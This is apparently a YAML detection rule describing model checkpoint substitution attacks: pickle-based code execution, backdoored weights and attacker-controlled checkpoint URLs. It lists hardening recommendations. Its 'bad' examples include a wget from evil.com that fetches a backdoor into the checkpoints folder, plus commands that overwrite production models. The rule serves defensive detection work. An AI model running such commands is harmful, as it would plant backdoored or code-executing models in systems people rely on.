id: "supply-chain/model-poisoning/checkpoint-substitution"
version: "1.0.0"
kingdom: "Supply Chain Compromise"
kingdom_id: 7
category: "Model Poisoning"
category_id: "7.4"
name: "Model Checkpoint Substitution"
risk_level: "critical"

abstract: |
  Replacing a legitimate model checkpoint file with a malicious one causes
  any system that loads the checkpoint to execute attacker-controlled model
  weights or embedded code (e.g., pickle exploits in PyTorch .pt files).

explanation: |
  Model checkpoint files (.pt, .pth, .pkl, .bin, .safetensors, .gguf) are
  deserialized at load time. PyTorch's default pickle-based serialization
  allows arbitrary Python code execution during deserialization. An agent
  that can overwrite checkpoint files can:
  - Replace a safe checkpoint with a pickle bomb that executes on model.load()
  - Substitute weights with a backdoored version that passes validation
  - Point a model config to an attacker-controlled checkpoint URL

  Checkpoint substitution is particularly dangerous because model loading
  is typically trusted and rarely inspected before execution.

recommendation: |
  - Verify checkpoint file hashes (SHA-256) before loading.
  - Use safetensors format instead of pickle-based .pt/.pkl files.
  - Restrict write permissions on model checkpoint directories.
  - Never allow AI agents to overwrite existing checkpoint files.
  - Use model signing for production checkpoints.

examples:
  bad:
    - "cp /tmp/malicious.pt models/production/model.pt"
    - "wget https://evil.com/backdoor.bin -O checkpoints/latest.bin"
    - "mv /tmp/poisoned_weights.safetensors models/deployed/model.safetensors"
  good:
    - "sha256sum models/production/model.pt  # verify before loading"
    - "python -c \"import safetensors; safetensors.torch.load_file('model.safetensors')\"  # read-only load"

compliance:
  owasp-llm-2025: ["LLM04"]
  iso-27001-2022: ["A.8.9", "A.8.20", "A.8.25"]
  eu-ai-act-2024: ["Art.9", "Art.15"]
  nist-ai-rmf-1.0: ["MAP-5", "MANAGE-2"]
  soc2-type2: ["CC8.1"]

references:
  mitre_attack: ["T1195", "T1565"]
  cwe: ["CWE-494", "CWE-502"]

analyzers: ["regex", "structural"]
related_rules: ["sc-block-ml-checkpoint-replace", "sc-audit-ml-checkpoint-write"]
